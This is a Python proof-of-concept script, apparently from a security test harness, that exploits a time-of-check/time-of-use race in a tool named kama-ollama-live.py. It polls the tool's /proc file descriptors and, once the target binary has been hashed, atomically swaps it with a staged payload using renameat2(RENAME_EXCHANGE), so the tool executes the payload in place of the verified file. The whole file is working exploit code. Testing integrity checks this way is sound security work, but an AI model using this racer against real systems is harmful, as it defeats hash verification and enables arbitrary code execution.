#!/usr/bin/env python3
"""A02BinarySwapRace stage-1 racer: fire an atomic renameat2(RENAME_EXCHANGE)
inside kama-ollama-live.py's hash-to-exec gap.

Method: the tool opens the target binary exactly once before exec (sha256_file);
after that fd closes it hashes the gguf, picks a port and only then execs the
path. This racer watches /proc/<toolpid>/fd for the target path appearing and
disappearing, and at the disappearance swaps the target directory entry with a
staged payload script. The exchange is atomic (RENAME_EXCHANGE), so there is no
window where the path is missing for the tool's later exec.

usage: exchange.py FLAG TARGET STAGE TLOG TIMEOUT
  FLAG    file that the driver writes the tool pid into once the tool is running
"""
import ctypes
import os
import sys
import time

AT_FDCWD = -100
RENAME_EXCHANGE = 2
SYS_renameat2 = 316  # x86_64


def renameat2_exchange(a, b):
    libc = ctypes.CDLL(None, use_errno=True)
    if hasattr(libc, 'renameat2'):
        libc.renameat2.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int,
                                   ctypes.c_char_p, ctypes.c_uint]
        rc = libc.renameat2(AT_FDCWD, a.encode(), AT_FDCWD, b.encode(), RENAME_EXCHANGE)
    else:
        libc.syscall.restype = ctypes.c_long
        rc = libc.syscall(SYS_renameat2, AT_FDCWD, a.encode(), AT_FDCWD,
                          b.encode(), RENAME_EXCHANGE)
    if rc != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))


def fd_links(pid):
    try:
        out = []
        for fd in os.listdir(f'/proc/{pid}/fd'):
            try:
                out.append(os.readlink(f'/proc/{pid}/fd/{fd}'))
            except OSError:
                pass
        return out
    except OSError:
        return None


def main():
    flag, target, stage, tlog = sys.argv[1:5]
    timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 120.0
    t0 = time.monotonic()
    pid = None
    while pid is None:
        try:
            with open(flag) as f:
                pid = int(f.read().strip())
        except (OSError, ValueError):
            if time.monotonic() - t0 > timeout:
                print('EXCHANGER arm-timeout')
                sys.exit(3)
            time.sleep(0.002)
    armed_ns = time.monotonic_ns()
    rt = os.path.realpath(target)
    open_seen = False
    open_ns = None
    while True:
        if time.monotonic() - t0 > timeout:
            print(f'EXCHANGER poll-timeout open_seen={open_seen}')
            sys.exit(4)
        links = fd_links(pid)
        if links is None:
            print(f'EXCHANGER tool-gone open_seen={open_seen}')
            sys.exit(5)
        if rt in links or target in links:
            if not open_seen:
                open_seen = True
                open_ns = time.monotonic_ns()
        elif open_seen:
            fire_ns = time.monotonic_ns()
            renameat2_exchange(target, stage)
            done_ns = time.monotonic_ns()
            line = (f'EXCHANGED pid={pid} open_ns={open_ns} fire_ns={fire_ns} '
                    f'done_ns={done_ns} latency_us={(fire_ns - open_ns) / 1000:.1f}')
            with open(tlog, 'a') as f:
                f.write(line + '\n')
            print('EXCHANGER', line)
            sys.exit(0)


main()
